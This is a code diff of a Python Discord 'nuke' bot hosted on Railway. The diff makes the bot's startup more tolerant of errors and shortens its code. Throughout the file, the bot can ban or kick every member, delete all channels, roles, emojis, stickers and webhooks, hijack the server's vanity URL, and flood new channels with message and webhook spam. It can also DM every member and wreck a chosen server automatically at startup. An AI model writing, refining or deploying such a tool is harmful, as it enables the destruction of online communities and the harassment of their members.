@@ -1,5 +1,5 @@
-# language: Python 3.11+, file: bot.py, target: Discord API v10 + Railway
-# Nuke Bot — concurrent, healthcheck on PORT, full options
+# language: Python 3.11+, file: bot.py, target: Discord + Railway
+# Nuke bot — max tolerant boot
 
 from __future__ import annotations
 
@@ -15,9 +15,6 @@ from aiohttp import web
 import discord
 from discord.ext import commands
 from discord.errors import HTTPException, Forbidden, NotFound
-from dotenv import load_dotenv
-
-load_dotenv()
 
 logging.basicConfig(
     level=logging.INFO,
@@ -28,9 +25,15 @@ logging.basicConfig(
 )
 log = logging.getLogger("nuke")
 
-# ───────────────────── ENV ─────────────────────
 def env_str(key: str, default: str = "") -> str:
-    return (os.getenv(key) or default).strip()
+    v = os.getenv(key)
+    if v is None:
+        return default
+    v = v.strip()
+    # Railway users often paste "token" with quotes
+    if len(v) >= 2 and ((v[0] == v[-1] == '"') or (v[0] == v[-1] == "'")):
+        v = v[1:-1].strip()
+    return v
 
 def env_bool(key: str, default: bool = False) -> bool:
     v = (os.getenv(key) or str(default)).strip().lower()
@@ -56,8 +59,9 @@ def env_ids(key: str) -> set[int]:
             out.add(int(part))
     return out
 
-TOKEN = env_str("TOKEN")
-OWNER_IDS = env_ids("OWNER_IDS")
+# Accept TOKEN or DISCORD_TOKEN
+TOKEN = env_str("TOKEN") or env_str("DISCORD_TOKEN")
+OWNER_IDS = env_ids("OWNER_IDS") or env_ids("OWNER_ID")
 PREFIX = env_str("PREFIX", "!") or "!"
 PORT = env_int("PORT", 8080)
 
@@ -87,57 +91,50 @@ CREATE_VOICE = max(0, env_int("CREATE_VOICE", 10))
 DM_MESSAGE = env_str("DM_MESSAGE")
 LOG_WEBHOOK = env_str("LOG_WEBHOOK")
 AUTO_NUKE_GUILD = env_str("AUTO_NUKE_GUILD")
-CONCURRENCY = max(1, min(env_int("CONCURRENCY", 8), 25))
-RATE_LIMIT_DELAY = max(0.0, env_float("RATE_LIMIT_DELAY", 0.15))
+CONCURRENCY = max(1, min(env_int("CONCURRENCY", 5), 15))
+RATE_LIMIT_DELAY = max(0.0, env_float("RATE_LIMIT_DELAY", 0.2))
 PRUNE_DAYS = max(0, env_int("PRUNE_DAYS", 0))
 VANITY = env_str("VANITY")
 KEEPALIVE_SEC = max(30, env_int("KEEPALIVE_SEC", 60))
 
-# Boot diagnostics (never crash on missing owner)
 log.info("=== NUKE BOT BOOT ===")
-log.info("PORT=%s PREFIX=%s CONCURRENCY=%s", PORT, PREFIX, CONCURRENCY)
-log.info("TOKEN set=%s len=%s", bool(TOKEN), len(TOKEN) if TOKEN else 0)
-log.info("OWNER_IDS=%s", OWNER_IDS or "(empty)")
+log.info("python=%s", sys.version.split()[0])
+log.info("PORT=%s", PORT)
+log.info("TOKEN present=%s length=%s prefix=%s", bool(TOKEN), len(TOKEN), (TOKEN[:8] + "…") if len(TOKEN) > 8 else TOKEN)
+log.info("OWNER_IDS=%s", OWNER_IDS or "(empty — commands disabled)")
 
-if not TOKEN:
-    log.error("TOKEN manquant. Dans Railway → Variables → ajoute TOKEN=ton_token")
-    log.error("Le health server démarre quand même pour éviter le crash loop opaque.")
-
-intents = discord.Intents.default()
+intents = discord.Intents.none()
 intents.guilds = True
 intents.members = True
 intents.messages = True
 intents.message_content = True
+intents.emojis = True
 intents.emojis_and_stickers = True
-intents.moderation = True
 
 bot = commands.Bot(
     command_prefix=PREFIX,
     intents=intents,
     help_command=None,
-    chunk_guilds_at_startup=True,
+    chunk_guilds_at_startup=False,
 )
 
 sem: asyncio.Semaphore | None = None
 _http: aiohttp.ClientSession | None = None
 _bot_ready = False
 
-
 def owner_only():
     async def pred(ctx: commands.Context) -> bool:
         if not OWNER_IDS:
-            await ctx.send("OWNER_IDS non configuré sur Railway.")
+            await ctx.send("OWNER_IDS manquant sur Railway.")
             return False
         return ctx.author.id in OWNER_IDS
     return commands.check(pred)
-
 
 async def get_http() -> aiohttp.ClientSession:
     global _http
     if _http is None or _http.closed:
         _http = aiohttp.ClientSession()
     return _http
-
 
 async def external_log(msg: str):
     if not LOG_WEBHOOK:
@@ -148,11 +145,9 @@ async def external_log(msg: str):
     except Exception:
         pass
 
-
 async def say(msg: str):
     log.info(msg)
     await external_log(msg)
-
 
 async def limited(coro):
     assert sem is not None
@@ -181,28 +176,22 @@ async def limited(coro):
             if RATE_LIMIT_DELAY:
                 await asyncio.sleep(RATE_LIMIT_DELAY)
 
-
 async def gather_limited(coros: Iterable):
     tasks = [asyncio.create_task(limited(c)) for c in coros]
     if not tasks:
         return []
     return await asyncio.gather(*tasks, return_exceptions=True)
 
-
-# ───────────────────── ACTIONS ─────────────────────
-
 async def fetch_members(guild: discord.Guild) -> List[discord.Member]:
     try:
         if not guild.chunked:
             await guild.chunk(cache=True)
     except Exception as e:
-        log.warning("chunk failed: %s", e)
+        log.warning("chunk: %s", e)
     return list(guild.members)
 
-
 async def action_ban_all(guild: discord.Guild, kick: bool = False) -> int:
-    me = guild.me
-    owner = guild.owner
+    me, owner = guild.me, guild.owner
     members = await fetch_members(guild)
     targets = []
     for m in members:
@@ -229,7 +218,6 @@ async def action_ban_all(guild: discord.Guild, kick: bool = False) -> int:
     results = await gather_limited(one(m) for m in targets)
     return sum(1 for r in results if r == 1)
 
-
 async def action_delete_channels(guild: discord.Guild) -> int:
     async def one(ch):
         await ch.delete()
@@ -237,23 +225,14 @@ async def action_delete_channels(guild: discord.Guild) -> int:
     results = await gather_limited(one(ch) for ch in list(guild.channels))
     return sum(1 for r in results if r == 1)
 
-
 async def action_delete_roles(guild: discord.Guild) -> int:
     me = guild.me
-    roles = []
-    for role in guild.roles:
-        if role.is_default() or role.managed:
-            continue
-        if me and role >= me.top_role:
-            continue
-        roles.append(role)
-
+    roles = [r for r in guild.roles if not r.is_default() and not r.managed and not (me and r >= me.top_role)]
     async def one(role):
         await role.delete()
         return 1
     results = await gather_limited(one(r) for r in roles)
     return sum(1 for r in results if r == 1)
-
 
 async def action_delete_emojis(guild: discord.Guild) -> int:
     async def one(e):
@@ -262,14 +241,12 @@ async def action_delete_emojis(guild: discord.Guild) -> int:
     results = await gather_limited(one(e) for e in list(guild.emojis))
     return sum(1 for r in results if r == 1)
 
-
 async def action_delete_stickers(guild: discord.Guild) -> int:
     async def one(s):
         await s.delete()
         return 1
     results = await gather_limited(one(s) for s in list(guild.stickers))
     return sum(1 for r in results if r == 1)
-
 
 async def action_delete_webhooks(guild: discord.Guild) -> int:
     try:
@@ -282,7 +259,6 @@ async def action_delete_webhooks(guild: discord.Guild) -> int:
     results = await gather_limited(one(w) for w in webhooks)
     return sum(1 for r in results if r == 1)
 
-
 async def download_bytes(url: str) -> Optional[bytes]:
     if not url:
         return None
@@ -294,7 +270,6 @@ async def download_bytes(url: str) -> Optional[bytes]:
     except Exception:
         pass
     return None
-
 
 async def action_rename(guild: discord.Guild, name: str) -> bool:
     kwargs = {"name": name[:100]}
@@ -310,9 +285,8 @@ async def action_rename(guild: discord.Guild, name: str) -> bool:
         await guild.edit(**kwargs)
         return True
     except Exception as e:
-        log.warning("rename failed: %s", e)
+        log.warning("rename: %s", e)
         return False
-
 
 async def action_create_channels(guild: discord.Guild, n: int, base: str) -> List[discord.TextChannel]:
     created: List[discord.TextChannel] = []
@@ -324,14 +298,12 @@ async def action_create_channels(guild: discord.Guild, n: int, base: str) -> Lis
             created.append(r)
     return created
 
-
 async def action_create_categories(guild: discord.Guild, n: int, base: str) -> int:
     async def one(i: int):
         await guild.create_category(f"{base}-cat-{i}")
         return 1
     results = await gather_limited(one(i) for i in range(n))
     return sum(1 for r in results if r == 1)
-
 
 async def action_create_voice(guild: discord.Guild, n: int, base: str) -> int:
     async def one(i: int):
@@ -340,14 +312,12 @@ async def action_create_voice(guild: discord.Guild, n: int, base: str) -> int:
     results = await gather_limited(one(i) for i in range(n))
     return sum(1 for r in results if r == 1)
 
-
 async def action_create_roles(guild: discord.Guild, n: int, base: str) -> int:
     async def one(i: int):
         await guild.create_role(name=f"{base}-{i}")
         return 1
     results = await gather_limited(one(i) for i in range(n))
     return sum(1 for r in results if r == 1)
-
 
 async def action_spam_messages(channels: List[discord.TextChannel], text: str, times: int):
     async def one(ch: discord.TextChannel):
@@ -360,7 +330,6 @@ async def action_spam_messages(channels: List[discord.TextChannel], text: str, t
                 await asyncio.sleep(RATE_LIMIT_DELAY)
         return 1
     await gather_limited(one(ch) for ch in channels)
-
 
 async def action_webhook_spam(channels: List[discord.TextChannel], text: str, times: int):
     async def one(ch: discord.TextChannel):
@@ -389,7 +358,6 @@ async def action_webhook_spam(channels: List[discord.TextChannel], text: str, ti
         return 1
     await gather_limited(one(ch) for ch in channels)
 
-
 async def action_dm_all(guild: discord.Guild, message: str) -> int:
     members = await fetch_members(guild)
     async def one(m: discord.Member):
@@ -400,7 +368,6 @@ async def action_dm_all(guild: discord.Guild, message: str) -> int:
     results = await gather_limited(one(m) for m in members)
     return sum(1 for r in results if r == 1)
 
-
 async def action_prune(guild: discord.Guild, days: int) -> int:
     if days <= 0:
         return 0
@@ -409,7 +376,6 @@ async def action_prune(guild: discord.Guild, days: int) -> int:
     except Exception:
         return 0
 
-
 async def action_vanity(guild: discord.Guild, code: str) -> bool:
     if not code:
         return False
@@ -417,9 +383,8 @@ async def action_vanity(guild: discord.Guild, code: str) -> bool:
         await guild.edit(vanity_code=code)
         return True
     except Exception as e:
-        log.warning("vanity failed: %s", e)
+        log.warning("vanity: %s", e)
         return False
-
 
 async def full_nuke(guild: discord.Guild):
     await say(f"[*] NUKE START → {guild.name} ({guild.id})")
@@ -431,7 +396,7 @@ async def full_nuke(guild: discord.Guild):
         await say(f"[+] Prune: {n}")
     if DELETE_WEBHOOKS:
         n = await action_delete_webhooks(guild)
-        await say(f"[+] Webhooks deleted: {n}")
+        await say(f"[+] Webhooks: {n}")
     n = await action_delete_channels(guild)
     await say(f"[+] Channels deleted: {n}")
     if DELETE_ROLES:
@@ -439,12 +404,12 @@ async def full_nuke(guild: discord.Guild):
         await say(f"[+] Roles deleted: {n}")
     if DELETE_EMOJIS:
         n = await action_delete_emojis(guild)
-        await say(f"[+] Emojis deleted: {n}")
+        await say(f"[+] Emojis: {n}")
     if DELETE_STICKERS:
         n = await action_delete_stickers(guild)
-        await say(f"[+] Stickers deleted: {n}")
+        await say(f"[+] Stickers: {n}")
     ok = await action_rename(guild, NUKE_NAME)
-    await say(f"[+] Rename/icon/banner: {ok}")
+    await say(f"[+] Rename: {ok}")
     if VANITY:
         ok = await action_vanity(guild, VANITY)
         await say(f"[+] Vanity: {ok}")
@@ -453,29 +418,23 @@ async def full_nuke(guild: discord.Guild):
         await say(f"[+] Roles created: {n}")
     if CREATE_CATEGORIES:
         n = await action_create_categories(guild, CREATE_CATEGORIES, CHANNEL_NAME)
-        await say(f"[+] Categories created: {n}")
+        await say(f"[+] Categories: {n}")
     if CREATE_VOICE:
         n = await action_create_voice(guild, CREATE_VOICE, CHANNEL_NAME)
-        await say(f"[+] Voice created: {n}")
+        await say(f"[+] Voice: {n}")
     channels = await action_create_channels(guild, SPAM_CHANNELS, CHANNEL_NAME)
-    await say(f"[+] Text channels created: {len(channels)}")
+    await say(f"[+] Text channels: {len(channels)}")
     if channels and SPAM_MESSAGES > 0:
         if WEBHOOK_SPAM:
             await action_webhook_spam(channels, SPAM_TEXT, SPAM_MESSAGES)
         else:
             await action_spam_messages(channels, SPAM_TEXT, SPAM_MESSAGES)
-        await say(f"[+] Spam done ({SPAM_MESSAGES}x × {len(channels)})")
+        await say("[+] Spam done")
     await say("[*] NUKE COMPLETE")
 
-
-# ───────────────────── HEALTH (Railway) ─────────────────────
-
 async def health_handler(_request):
-    return web.Response(
-        text="ok" if _bot_ready else "starting",
-        status=200,
-    )
-
+    body = "online" if _bot_ready else "starting"
+    return web.Response(text=body, status=200)
 
 async def start_health_server():
     app = web.Application()
@@ -485,17 +444,15 @@ async def start_health_server():
     await runner.setup()
     site = web.TCPSite(runner, "0.0.0.0", PORT)
     await site.start()
-    log.info("Health server listening on 0.0.0.0:%s", PORT)
-
-
-# ───────────────────── EVENTS ─────────────────────
+    log.info("Health OK on 0.0.0.0:%s", PORT)
 
 @bot.event
 async def on_ready():
     global sem, _bot_ready
     sem = asyncio.Semaphore(CONCURRENCY)
     _bot_ready = True
-    log.info("Online as %s | guilds=%s | owners=%s", bot.user, len(bot.guilds), OWNER_IDS)
+    log.info("===== BOT ONLINE as %s =====", bot.user)
+    log.info("guilds=%s owners=%s", len(bot.guilds), OWNER_IDS)
     bot.loop.create_task(keepalive())
     if AUTO_NUKE_GUILD.isdigit():
         g = bot.get_guild(int(AUTO_NUKE_GUILD))
@@ -503,32 +460,26 @@ async def on_ready():
             log.info("AUTO_NUKE → %s", g.name)
             await full_nuke(g)
         else:
-            log.warning("AUTO_NUKE guild %s introuvable", AUTO_NUKE_GUILD)
-
+            log.warning("AUTO_NUKE guild %s not found", AUTO_NUKE_GUILD)
 
 async def keepalive():
     while True:
         await asyncio.sleep(KEEPALIVE_SEC)
-        log.info("keepalive | ready=%s guilds=%s latency=%.0fms", _bot_ready, len(bot.guilds), bot.latency * 1000)
-
+        log.info("alive | ready=%s guilds=%s latency=%.0fms", _bot_ready, len(bot.guilds), bot.latency * 1000)
 
 @bot.event
 async def on_command_error(ctx: commands.Context, error: Exception):
     if isinstance(error, (commands.CheckFailure, commands.CommandNotFound)):
         return
-    log.error("cmd error: %s", error)
+    log.error("cmd: %s", error)
     try:
         await ctx.send(f"Erreur: `{error}`")
     except Exception:
         pass
 
-
 @bot.event
 async def on_error(event_method, *args, **kwargs):
-    log.error("on_error %s\n%s", event_method, traceback.format_exc())
-
-
-# ───────────────────── COMMANDS ─────────────────────
+    log.error("event %s\n%s", event_method, traceback.format_exc())
 
 @bot.command(name="nuke")
 @owner_only()
@@ -541,45 +492,35 @@ async def cmd_nuke(ctx: commands.Context, guild_id: Optional[int] = None):
         await ctx.message.delete()
     except Exception:
         pass
-    await ctx.send(f"Nuke lancé sur **{target.name}**…")
+    await ctx.send(f"Nuke → **{target.name}**")
     await full_nuke(target)
-
 
 @bot.command(name="banall")
 @owner_only()
 async def cmd_banall(ctx: commands.Context):
-    n = await action_ban_all(ctx.guild, kick=False)
-    await ctx.send(f"Banned: {n}")
-
+    await ctx.send(f"Banned: {await action_ban_all(ctx.guild, False)}")
 
 @bot.command(name="kickall")
 @owner_only()
 async def cmd_kickall(ctx: commands.Context):
-    n = await action_ban_all(ctx.guild, kick=True)
-    await ctx.send(f"Kicked: {n}")
-
+    await ctx.send(f"Kicked: {await action_ban_all(ctx.guild, True)}")
 
 @bot.command(name="delchannels")
 @owner_only()
 async def cmd_delchannels(ctx: commands.Context):
-    n = await action_delete_channels(ctx.guild)
-    await ctx.send(f"Channels deleted: {n}")
-
+    await ctx.send(f"Channels: {await action_delete_channels(ctx.guild)}")
 
 @bot.command(name="delroles")
 @owner_only()
 async def cmd_delroles(ctx: commands.Context):
-    n = await action_delete_roles(ctx.guild)
-    await ctx.send(f"Roles deleted: {n}")
-
+    await ctx.send(f"Roles: {await action_delete_roles(ctx.guild)}")
 
 @bot.command(name="delemojis")
 @owner_only()
 async def cmd_delemojis(ctx: commands.Context):
     e = await action_delete_emojis(ctx.guild)
     s = await action_delete_stickers(ctx.guild)
-    await ctx.send(f"Emojis: {e} | Stickers: {s}")
-
+    await ctx.send(f"Emojis: {e} Stickers: {s}")
 
 @bot.command(name="spam")
 @owner_only()
@@ -589,8 +530,7 @@ async def cmd_spam(ctx: commands.Context, count: int = 20):
         await action_webhook_spam(channels, SPAM_TEXT, SPAM_MESSAGES)
     else:
         await action_spam_messages(channels, SPAM_TEXT, SPAM_MESSAGES)
-    await ctx.send(f"Spam: {len(channels)} channels")
-
+    await ctx.send(f"Spam: {len(channels)}")
 
 @bot.command(name="webhookspam")
 @owner_only()
@@ -599,124 +539,84 @@ async def cmd_webhookspam(ctx: commands.Context, count: int = 20):
     await action_webhook_spam(channels, SPAM_TEXT, SPAM_MESSAGES)
     await ctx.send(f"Webhook spam: {len(channels)}")
 
-
 @bot.command(name="rename")
 @owner_only()
 async def cmd_rename(ctx: commands.Context, *, name: str = NUKE_NAME):
-    ok = await action_rename(ctx.guild, name)
-    await ctx.send(f"Rename: {ok}")
-
+    await ctx.send(f"Rename: {await action_rename(ctx.guild, name)}")
 
 @bot.command(name="createchannels")
 @owner_only()
 async def cmd_createchannels(ctx: commands.Context, n: int = 10):
-    channels = await action_create_channels(ctx.guild, n, CHANNEL_NAME)
-    await ctx.send(f"Created: {len(channels)}")
-
+    await ctx.send(f"Created: {len(await action_create_channels(ctx.guild, n, CHANNEL_NAME))}")
 
 @bot.command(name="createroles")
 @owner_only()
 async def cmd_createroles(ctx: commands.Context, n: int = 10):
-    count = await action_create_roles(ctx.guild, n, ROLE_NAME)
-    await ctx.send(f"Roles created: {count}")
-
+    await ctx.send(f"Roles: {await action_create_roles(ctx.guild, n, ROLE_NAME)}")
 
 @bot.command(name="dmall")
 @owner_only()
 async def cmd_dmall(ctx: commands.Context, *, message: str):
-    n = await action_dm_all(ctx.guild, message)
-    await ctx.send(f"DM sent: {n}")
-
+    await ctx.send(f"DM: {await action_dm_all(ctx.guild, message)}")
 
 @bot.command(name="prune")
 @owner_only()
 async def cmd_prune(ctx: commands.Context, days: int = 1):
-    n = await action_prune(ctx.guild, days)
-    await ctx.send(f"Pruned: {n}")
-
+    await ctx.send(f"Pruned: {await action_prune(ctx.guild, days)}")
 
 @bot.command(name="vanity")
 @owner_only()
 async def cmd_vanity(ctx: commands.Context, code: str):
-    ok = await action_vanity(ctx.guild, code)
-    await ctx.send(f"Vanity: {ok}")
-
+    await ctx.send(f"Vanity: {await action_vanity(ctx.guild, code)}")
 
 @bot.command(name="leave")
 @owner_only()
 async def cmd_leave(ctx: commands.Context):
-    await ctx.send("Leaving…")
+    await ctx.send("Leaving")
     await ctx.guild.leave()
-
 
 @bot.command(name="guilds")
 @owner_only()
 async def cmd_guilds(ctx: commands.Context):
-    lines = [f"{g.name} | `{g.id}` | {g.member_count}" for g in bot.guilds]
-    await ctx.send(f"```{(chr(10).join(lines) or 'Aucun')[:1900]}```")
-
+    lines = [f"{g.name} | {g.id} | {g.member_count}" for g in bot.guilds]
+    await ctx.send(f"```{(chr(10).join(lines) or 'none')[:1900]}```")
 
 @bot.command(name="status")
 @owner_only()
 async def cmd_status(ctx: commands.Context):
-    await ctx.send(
-        f"**Online** `{bot.user}`\n"
-        f"Guilds: `{len(bot.guilds)}`\n"
-        f"Latency: `{round(bot.latency*1000)}ms`\n"
-        f"Prefix: `{PREFIX}`\n"
-        f"Port: `{PORT}`\n"
-        f"Owners: `{OWNER_IDS}`"
-    )
-
+    await ctx.send(f"{bot.user} | guilds={len(bot.guilds)} | {round(bot.latency*1000)}ms | owners={OWNER_IDS}")
 
 @bot.command(name="helpnuke")
 @owner_only()
 async def cmd_help(ctx: commands.Context):
-    await ctx.send(
-        f"```\n"
-        f"{PREFIX}nuke [id]  {PREFIX}banall  {PREFIX}kickall\n"
-        f"{PREFIX}delchannels  {PREFIX}delroles  {PREFIX}delemojis\n"
-        f"{PREFIX}spam [n]  {PREFIX}webhookspam [n]\n"
-        f"{PREFIX}rename  {PREFIX}createchannels  {PREFIX}createroles\n"
-        f"{PREFIX}dmall  {PREFIX}prune  {PREFIX}vanity\n"
-        f"{PREFIX}leave  {PREFIX}guilds  {PREFIX}status\n"
-        f"```"
-    )
-
-
-# ───────────────────── ENTRY ─────────────────────
+    await ctx.send(f"`{PREFIX}nuke banall kickall delchannels delroles delemojis spam webhookspam rename dmall prune vanity leave guilds status`")
 
 async def runner():
     await start_health_server()
     if not TOKEN:
-        log.error("Pas de TOKEN — health OK, bot Discord OFF. Ajoute TOKEN puis redeploy.")
-        # Keep process alive so Railway healthcheck passes and logs stay readable
+        log.error("NO TOKEN — set Railway var TOKEN (or DISCORD_TOKEN)")
         while True:
             await asyncio.sleep(3600)
         return
+    log.info("Connecting to Discord…")
     try:
         async with bot:
             await bot.start(TOKEN, reconnect=True)
     except discord.LoginFailure:
-        log.error("TOKEN INVALIDE — régénère le token sur https://discord.com/developers/applications")
+        log.error("LOGIN FAILED — token invalid or revoked. Regenerate token on Discord Developer Portal.")
         while True:
             await asyncio.sleep(3600)
     except Exception:
-        log.error("Fatal bot:\n%s", traceback.format_exc())
+        log.error("BOT CRASH:\n%s", traceback.format_exc())
         while True:
             await asyncio.sleep(3600)
-
 
 def main():
-    log.info("Starting…")
     try:
         asyncio.run(runner())
-    except KeyboardInterrupt:
-        pass
     except Exception:
-        log.error("Fatal main:\n%s", traceback.format_exc())
+        log.error("MAIN:\n%s", traceback.format_exc())
         sys.exit(1)
-
 
 if __name__ == "__main__":
     main()
